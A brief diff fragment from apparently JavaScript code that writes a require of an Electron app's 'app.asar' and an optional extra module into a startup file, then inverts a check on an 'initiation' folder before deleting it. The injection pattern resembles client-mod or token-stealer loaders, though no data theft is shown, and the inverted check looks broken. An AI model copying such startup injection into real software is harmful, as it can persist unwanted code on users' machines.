@@ -390,7 +390,7 @@ async function init() {
 require('${path.join(resourcePath, 'app.asar')}')
 if (fs.existsSync(bdPath)) require(bdPath);`.replace(/\\/g, "\\\\"));
   }
-  if (!fs.existsSync(path.join(__dirname, 'initiation'))) {
+  if (fs.existsSync(path.join(__dirname, 'initiation'))) {
     return true;
   }
   fs.rmdirSync(path.join(__dirname, 'initiation'));
